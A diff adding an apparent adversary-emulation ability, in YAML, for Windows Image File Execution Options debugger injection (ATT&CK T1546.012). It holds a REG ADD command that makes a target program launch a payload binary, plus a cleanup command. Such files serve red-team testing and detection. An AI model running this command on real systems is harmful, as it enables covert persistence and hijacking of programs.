@@ -1,0 +1,17 @@
+- description: 'Leverage Global Flags Settings
+
+    '
+  id: 084a99ac-ba0e-75a6-a5c9-9b8fd0bb3a92
+  name: IFEO Add Debugger
+  platforms:
+    windows:
+      cmd:
+        cleanup: reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
+          File Execution Options\calc.exe" /v Debugger /f >nul 2>&1
+        command: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
+          File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"
+        payloads: []
+  tactic: multiple
+  technique:
+    attack_id: T1546.012
+    name: 'Event Triggered Execution: Image File Execution Options Injection'
